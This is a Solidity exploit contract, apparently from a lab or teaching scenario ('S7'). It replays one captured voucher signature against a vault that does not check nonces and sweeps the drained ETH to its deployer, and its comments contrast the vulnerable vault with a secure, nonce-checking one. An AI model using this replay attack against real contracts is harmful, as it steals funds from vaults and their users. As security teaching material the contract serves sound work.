// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IClaim} from "./IClaim.sol";

/**
 * @title Attacker
 * @notice Signature-replay bot for scenario S7.
 * @dev Redeems a captured voucher for itself. Against {VulnerableClaim} the
 *      same signature can be submitted again and again; against {SecureClaim}
 *      the second submission reverts because the nonce is already spent.
 */
contract Attacker {
    /// @notice Vault being drained.
    IClaim public immutable claim;

    /// @notice Deployer, which receives swept proceeds.
    address payable public immutable owner;

    error ZeroTarget();
    error SweepFailed();

    /**
     * @param target voucher vault to replay against
     */
    constructor(address target) {
        if (target == address(0)) {
            revert ZeroTarget();
        }
        claim = IClaim(target);
        owner = payable(msg.sender);
    }

    /**
     * @notice Redeem a captured voucher to this contract.
     * @param amount    voucher amount
     * @param nonce     voucher nonce (ignored by the vulnerable vault)
     * @param signature captured issuer signature
     */
    function attack(uint256 amount, uint256 nonce, bytes calldata signature) external {
        claim.claim(payable(address(this)), amount, nonce, signature);
    }

    /// @notice Value replayed so far, i.e. this contract's ETH balance.
    function profit() external view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice Move the replayed funds out of this contract.
     * @return amount ETH sent to {owner}
     */
    function sweep() external returns (uint256 amount) {
        amount = address(this).balance;
        (bool ok,) = owner.call{value: amount}("");
        if (!ok) {
            revert SweepFailed();
        }
    }

    receive() external payable {}
}
